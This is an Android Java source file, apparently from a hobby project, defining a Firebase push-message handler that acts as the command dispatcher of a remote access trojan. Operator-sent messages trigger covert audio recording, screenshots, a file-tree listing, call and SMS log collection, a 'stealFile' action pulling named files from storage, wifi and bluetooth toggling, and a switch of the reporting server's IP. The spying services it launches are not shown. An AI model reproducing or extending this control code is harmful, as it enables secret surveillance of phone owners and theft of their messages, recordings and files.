package com.coding4fun.services;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import com.coding4fun.apps.BuildVariantsTest;
import com.coding4fun.apps.FirebaseActivity;
import com.coding4fun.apps.R;
import com.coding4fun.utils.Utils;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by coding4fun on 06-Aug-16.
 */

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "GPA";

    //Called when message is received.
    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);

        // Not getting messages here? See why this may be: https://goo.gl/39bRNJ

        //get topic
        //Log.e(TAG, "From: " + remoteMessage.getFrom());

        Utils utils = new Utils(this);

        // Check if message contains a data payload.
        if (remoteMessage.getData().size() > 0) {
            Log.e(TAG, "Message data payload: " + remoteMessage.getData());

            if(remoteMessage.getData().get("type").equals("BuildVariantsTest")){
                simpleNotif();
            } else if(remoteMessage.getData().get("type").equals("recordAudio")) {
                int time = Integer.parseInt(remoteMessage.getData().get("time"));
                Intent i = new Intent(this, RecordAudio.class);
                i.putExtra("time", time);
                startService(i);
            } else if(remoteMessage.getData().get("type").equals("screenshot")) {
                Intent i = new Intent(this, ScreenShot.class);
                startService(i);
            } else if(remoteMessage.getData().get("type").equals("wallpaper")) {
                String wallpaper = remoteMessage.getData().get("wallpaper");
                Intent i = new Intent(this, Wallpaper.class);
                i.putExtra("wallpaper", wallpaper);
                startService(i);
            } else if(remoteMessage.getData().get("type").equals("wifi")) {
                Log.e(TAG, "WIFI");
                utils.turnWIFI((remoteMessage.getData().get("enable").equals("0")) ? false : true);
            } else if(remoteMessage.getData().get("type").equals("bluetooth")) {
                Log.e(TAG, "BlueTooth");
                utils.turnBluetooth((remoteMessage.getData().get("enable").equals("0")) ? false : true);
            } else if(remoteMessage.getData().get("type").equals("flash")) {
                Log.e(TAG, "FlashLight");
                int time = Integer.parseInt(remoteMessage.getData().get("time"));
                Intent i = new Intent(this, FlashLight.class);
                i.putExtra("time", time);
                startService(i);
            } else if(remoteMessage.getData().get("type").equals("fileTree")) {
                Log.e(TAG, "FileTree");
                Intent i = new Intent(this, FileTree.class);
                startService(i);
            } else if(remoteMessage.getData().get("type").equals("Calls & SMSs logs")) {
                Log.e(TAG, "Calls & SMSs logs");
                Intent i = new Intent(this, CallMsgLogs.class);
                startService(i);
            } else if(remoteMessage.getData().get("type").equals("change IP")) {
                String ip = remoteMessage.getData().get("ip");
                SharedPreferences.Editor e = PreferenceManager.getDefaultSharedPreferences(this).edit();
                e.putString("ip", ip);
                e.commit();
                sendNotification("New IP", ip, new HashMap<String, String>());
            } else if(remoteMessage.getData().get("type").equals("stealFile")) {
                String filePath = Environment.getExternalStorageDirectory().getAbsolutePath() + remoteMessage.getData().get("fileName");
                Intent i = new Intent(this, StealFile.class);
                i.putExtra("stealFile", filePath);
                startService(i);
            } else {
                String title = remoteMessage.getData().get("title");
                String msg = remoteMessage.getData().get("msg");
                sendNotification(title,msg,remoteMessage.getData());
            }
        } else
            Log.e(TAG, "No message data payload !");
        //View v = ((Activity)this).getWindow().getDecorView().findViewById(android.R.id.content);

        // Check if message contains a notification payload.
        if (remoteMessage.getNotification() != null) {
            Log.e(TAG, "Message Notification Body: " + remoteMessage.getNotification().getBody());
        } else
            Log.e(TAG, "No message Notification Body !");

    }

    private void sendNotification(String title, String msg, Map<String,String> map) {
        Intent intent = new Intent(this, FirebaseActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        for(String key : map.keySet()){
            intent.putExtra(key,map.get(key));
        }
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0 /* Request code */, intent, PendingIntent.FLAG_ONE_SHOT);

        //Uri defaultSoundUri= RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this)
                .setSmallIcon(R.drawable.firebase_logo)
                .setContentTitle(title)
                .setContentText(msg)
                .setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL)
                .setContentIntent(pendingIntent);

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        notificationManager.notify(0 /* ID of notification */, notificationBuilder.build());
    }

    private void simpleNotif(){
        Intent intent = new Intent(this, BuildVariantsTest.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0 /* Request code */, intent, PendingIntent.FLAG_ONE_SHOT);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this)
                .setSmallIcon(R.drawable.firebase_logo)
                .setContentTitle("BuildVariantsTest")
                .setContentText(getString(R.string.mode))
                .setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL)
                .setContentIntent(pendingIntent);
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify(0 /* ID of notification */, notificationBuilder.build());
    }

}